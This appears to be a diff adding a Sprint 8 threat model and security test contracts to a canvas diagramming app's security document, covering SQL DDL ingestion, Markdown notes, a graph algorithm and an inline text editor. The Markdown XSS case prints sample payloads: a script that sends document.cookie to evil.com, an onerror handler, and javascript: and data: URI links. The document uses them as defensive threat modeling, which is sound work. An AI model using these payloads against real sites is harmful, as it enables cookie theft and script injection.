@@ -583,3 +583,80 @@ Sprint 6 reorganizes the inspector panel docking and contextual visibility, re-e
 | SEC-S7-04 | Defense-in-Depth Confinement Check | **4.0 (LOW)** | 0.0 (N/A) | 🟢 Resolved |
 
 > **Note:** All vulnerabilities are confined to the **Vite development server only** and cannot be triggered in a production build (`npm run build` → static files, no Node.js middleware). However, arbitrary file write on a developer's machine during `npm run dev` is still a High severity risk given the potential for source-code tampering.
+
+---
+
+# 8. Sprint 8: Advanced Architecture Modeling, Reverse DDL, Markdown Notes & True Canvas Text Experience Threat Model & Security Tests
+
+### 8.1 Threat Modeling (Sprint 8)
+Sprint 8 introduces ingestion of arbitrary SQL DDL files, rich client-side Markdown rendering for architectural documentation cards and sticky notes, flow-directed dominator tree algorithms on directed graphs, and authentic frameless floating canvas text editing.
+
+| Vulnerability ID | Threat Vector | OWASP Category | Severity | Mitigation Strategy | Status |
+|---|---|---|---|---|:---:|
+| **SEC-S8-01** | SQL DDL Parser ReDoS & Oversized Schema Ingestion DoS | A04:2021-Insecure Design | High | Bounded regular expressions (no nested quantifiers), 5MB hard payload ceiling before parse, iterative tokenization with maximum 5,000 column/table token guard. | 🟢 **Design Guarded** |
+| **SEC-S8-02** | Markdown Notes XSS & Malicious URI Scheme Execution | A03:2021-Injection | High | Strict Markdown AST / HTML sanitization: disallow `<script>`, `<iframe>`, `object`, `embed`; restrict URI schemes to `http:`, `https:`, `mailto:`, and `#`; pure canvas rasterization (`ctx.fillText`) and XML-escaped SVG export. | 🟢 **Design Guarded** |
+| **SEC-S8-03** | Dominator Tree Dense/Cyclic Graph Call Stack Exhaustion | A04:2021-Insecure Design | High | Directed cycle detection & Tarjan SCC pre-pass, iterative Lengauer-Tarjan algorithm avoiding deep recursion, execution timeout cutoff (50ms). | 🟢 **Design Guarded** |
+| **SEC-S8-04** | Inline Canvas Floating Text Editor DOM Injection & Memory Leakage | A03:2021-Injection / Memory Safety | Medium | Plaintext `textContent` binding (never `innerHTML`), 50,000 character buffer ceiling, unconditional blur/click-outside commit handler with event listener cleanup. | 🟢 **Design Guarded** |
+
+### 8.2 Sprint 8 Security Test Cases & Verification Contracts
+
+* **SEC-S8-01 (SQL DDL Parser Injection & Regex Denial-of-Service):**
+  - **Attack Vector:** An attacker supplies a `.sql` file crafted with pathological backtracking constructs:
+    ```sql
+    CREATE TABLE evil (
+      col1 VARCHAR(255) /* repeated nested comments (((...))) */,
+      col2 TEXT DEFAULT '(((((((((((((((((((((((((((((((((((((((('
+    );
+    ```
+    or a 100MB dumped SQL file designed to lock the main thread or cause browser tab OOM.
+  - **Mitigation Requirement:**
+    1. Pre-flight file size check enforces `file.size <= 5 * 1024 * 1024` (5MB ceiling). Files exceeding 5MB are rejected immediately with a user-friendly error toast.
+    2. SQL tokenizer and table extractor use linear scans or bounded regular expressions without catastrophic backtracking (no nested `(a+)+` or overlapping capture groups).
+    3. Parser enforces a maximum table limit (e.g., 200 tables) and column limit (e.g., 100 columns per table) to safeguard memory and spatial canvas layout.
+  - **Status:** **Guarded by Design Contract** (Strict prerequisite for Milestone 8.1).
+
+* **SEC-S8-02 (Markdown Notes XSS & URI Scheme Sanitization):**
+  - **Attack Vector:** An attacker imports or pastes a Markdown note containing malicious vectors:
+    ```markdown
+    # ADR-001: Architecture Decision
+    <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
+    <img src="x" onerror="alert(document.domain)">
+    [Click here to review docs](javascript:alert(window.origin))
+    [Malicious SVG data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+    ```
+  - **Mitigation Requirement:**
+    1. On-canvas rendering rasterizes Markdown syntax strictly using custom 2D canvas routines with plain `ctx.fillText()`. HTML tags within the markdown text are rendered as literal text (escaped) or stripped, preventing any browser execution context.
+    2. Interactive markdown modals or preview cards (if DOM-rendered) must pipe output through a strict sanitizer (stripping all `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`, and inline `on*` event handlers).
+    3. Markdown link parsing strictly enforces an allowlist of permitted protocols: `http:`, `https:`, `mailto:`, or internal anchor `#`. Links with `javascript:`, `vbscript:`, or `data:` schemes are stripped or rewritten to `about:blank`.
+    4. SVG exports escape all `<text>` and XML attribute nodes using strict entity encoding (`&`, `<`, `>`, `"`, `'`).
+  - **Status:** **Guarded by Design Contract** (Strict prerequisite for Milestone 8.2).
+
+* **SEC-S8-03 (Dominator Tree Graph Complexity & Cyclic Resource Exhaustion):**
+  - **Attack Vector:** Attacker creates or imports a dense cyclical graph ($N = 1,000$, fully connected or complex cyclic feedback loops) and triggers flow simulation SPOF analysis, attempting to trigger infinite recursion or $\mathcal{O}(2^N)$ call stack exhaustion.
+  - **Mitigation Requirement:**
+    1. Directed dominator tree algorithm is implemented iteratively (or iterative Lengauer-Tarjan / Cooper-Harvey-Kennedy dataflow algorithm) rather than naive recursive DFS.
+    2. Node and edge limits for real-time SPOF path highlighting are capped (e.g., max 500 active connected nodes per evaluation pass).
+    3. Traversal incorporates an execution watchdog: if dominator calculation exceeds 50ms, execution is throttled with a debounced warning toast.
+  - **Status:** **Guarded by Design Contract** (Strict prerequisite for Milestone 8.3).
+
+* **SEC-S8-04 (Floating Canvas Text Editor DOM Injection & Event Cleanup):**
+  - **Attack Vector:**
+    1. Pasting clipboard data containing raw HTML or script tags into the text input overlay.
+    2. Rapidly creating text elements without closing, causing orphan DOM textarea nodes and event listener memory leaks.
+  - **Mitigation Requirement:**
+    1. The floating text input uses an unstyled or minimal floating `<textarea>` overlay whose content is retrieved strictly via `.value` and assigned to `element.text` as a raw string.
+    2. Canvas rendering exclusively uses `ctx.fillText()`, guaranteeing that no HTML parsing occurs.
+    3. Input commit is guaranteed on `blur`, `Escape`, or clicking anywhere outside the active text bounds.
+    4. When committed, the floating textarea is removed from the DOM and all attached event listeners are explicitly unbinded or cleaned up, preventing memory leaks.
+  - **Status:** **Guarded by Design Contract** (Strict prerequisite for Milestone 8.4).
+
+---
+
+## Sprint 8 CVSS Risk Summary
+
+| Test ID | Vulnerability Class | CVSS v3 Base Score (Pre-Mitigation) | CVSS v3 Base Score (Post-Mitigation) | Status |
+|---|---|---|---|---|
+| SEC-S8-01 | ReDoS / Memory Exhaustion via Malicious SQL DDL | **7.5 (HIGH)** | 0.0 (N/A) | 🟢 Design Guarded |
+| SEC-S8-02 | Stored XSS & Malicious URI Scheme in Markdown Notes | **7.2 (HIGH)** | 0.0 (N/A) | 🟢 Design Guarded |
+| SEC-S8-03 | Denial of Service via Pathological Dominator Cycles | **5.3 (MEDIUM)** | 0.0 (N/A) | 🟢 Design Guarded |
+| SEC-S8-04 | DOM Injection & Event Listener Leak in Canvas Text Editor | **4.3 (MEDIUM)** | 0.0 (N/A) | 🟢 Design Guarded |
